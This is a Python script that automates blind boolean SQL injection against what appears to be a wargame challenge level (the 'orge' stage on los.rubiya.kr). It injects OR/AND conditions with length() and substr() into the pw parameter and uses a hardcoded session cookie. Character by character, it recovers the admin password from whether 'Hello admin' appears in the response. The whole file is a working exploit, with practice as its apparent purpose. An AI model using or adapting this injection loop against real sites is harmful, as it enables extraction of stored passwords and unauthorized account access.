import requests
lenth=0
session_id={'PHPSESSID':'u5r1drkse5h11j80b3ljm8h5c0'}
parameters="01234567890123456789abcdefghijklmnopqrstuvwxyz"

for i in range(1,10):
    URL = "http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw=' or id='admin' and length(pw)="+str(i)+"--%20"
    respone = requests.get(url=URL,cookies=session_id)
    print(respone.url)
    if 'Hello admin' in respone.text:
        print(i)
        length=i
        break
password=''
for i in range(1,length+1):
    for j in parameters:
        URL = "http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw=' or id='admin' and substr(pw,"+str(i)+",1)=\'"+str(j)+"\'--%20"
        respone=requests.get(url=URL,cookies=session_id)
        print(respone.url,"password : "+password)
        if 'Hello admin' in respone.text:
            password+=str(j)
            print(j)
            break
print(password)
